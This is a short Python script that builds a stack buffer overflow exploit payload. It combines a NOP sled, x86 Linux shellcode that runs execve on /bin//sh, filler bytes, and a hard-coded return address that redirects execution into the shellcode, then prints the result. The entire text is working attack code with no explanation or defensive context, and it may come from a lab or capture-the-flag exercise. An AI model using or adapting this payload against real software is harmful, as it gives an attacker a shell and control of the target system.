import struct

shellcode = b"\x90" * 20 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

padding = b"A" * (80 - len(shellcode))

eip = struct.pack("<I", 0x804a008)

payload = shellcode + padding + eip

print(payload)